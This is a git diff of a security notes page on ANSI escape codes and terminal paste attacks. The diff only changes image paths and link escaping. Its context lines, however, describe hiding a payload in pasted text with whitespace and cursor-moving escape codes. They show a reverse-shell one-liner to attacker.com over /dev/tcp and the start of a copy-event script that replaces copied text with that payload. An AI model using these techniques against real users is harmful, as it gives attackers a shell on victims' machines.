@@ -45,9 +45,9 @@ uid=1001(user) gid=1001(user) groups=1001(user)
 
 Another common action is copy-pasting commands from websites into your terminal. This has similar risks, and most terminals implement some warning to preview the multiple lines you are about to paste into it. A problem however is that it **cannot display all lines** and by adding lots of whitespace the user is required to manually scroll down to the hidden payload:
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt="" width="400"><figcaption><p>Windows Terminal warning on multiline-paste</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1).png" alt="" width="400"><figcaption><p>Windows Terminal warning on multiline-paste</p></figcaption></figure>
 
-If we just write some payload like a reverse shell at the end, there is a good chance the victim won't notice. After pasting it, however, it is very obvious that something malicious happened because the whole command history is right in front of them. And that's where [trick 2](https://en.wikipedia.org/wiki/ANSI\_escape\_code#CSI\_\(Control\_Sequence\_Introducer\)\_sequences) comes in!
+If we just write some payload like a reverse shell at the end, there is a good chance the victim won't notice. After pasting it, however, it is very obvious that something malicious happened because the whole command history is right in front of them. And that's where [trick 2](https://en.wikipedia.org/wiki/ANSI_escape_code#CSI_\(Control_Sequence_Introducer\)_sequences) comes in!
 
 * `\x1b[8A`: Move the cursor 8 lines up
 * `\x1b[J`: Clear from the cursor to the end of the screen
@@ -74,7 +74,7 @@ If you notice above   spaces were added before the payload commands to also hide
 bash -c "script -c 'bash -i' /dev/null </dev/tcp/attacker.com/1337 >&0 2>&1"
 ```
 
-In order to cleanly deliver such a payload from a website, the [copy event](https://developer.mozilla.org/en-US/docs/Web/API/Element/copy\_event) can be used to overwrite anything the user copies:
+In order to cleanly deliver such a payload from a website, the [copy event](https://developer.mozilla.org/en-US/docs/Web/API/Element/copy_event) can be used to overwrite anything the user copies:
 
 <pre class="language-html"><code class="lang-html">&#x3C;script>
   const PAYLOAD = `${"\n".repeat(6)}
@@ -111,8 +111,8 @@ See the following table for a list of all these colors:
 
 To use a color like this, put it in the ESC code syntax with the correct number. You can also provide a foreground number as well as a background number, by separating them with a `;` semicolon (order doesn't matter). Here are a few examples:
 
-* ![](<../.gitbook/assets/image (7) (2).png>): `\x1b[31mRed` (31 = Foreground red)
-* ![](<../.gitbook/assets/image (4) (1) (1).png>): `\x1b[44mBlue` (44 = Background blue)
+* ![](<../.gitbook/assets/image (7) (2) (1).png>): `\x1b[31mRed` (31 = Foreground red)
+* ![](<../.gitbook/assets/image (4) (1) (1) (1).png>): `\x1b[44mBlue` (44 = Background blue)
 * ![](<../.gitbook/assets/image (38).png>): `\x1b[42;30mGreen` (42 = Background green, 30 = Foreground black)
 * ![](<../.gitbook/assets/image (29).png>): `\x1b[31mred \x1b[0mreset` (0 = Reset)
 
@@ -142,7 +142,7 @@ print("\x1b[31mRed\x1b[0m")
 
 ### Minecraft
 
-![](<../.gitbook/assets/image (1) (2) (1).png>)   [https://minecraft.fandom.com/wiki/Formatting\_codes](https://minecraft.fandom.com/wiki/Formatting\_codes)
+![](<../.gitbook/assets/image (1) (2) (1).png>)   [https://minecraft.fandom.com/wiki/Formatting\_codes](https://minecraft.fandom.com/wiki/Formatting_codes)
 
 #### Normal text
 
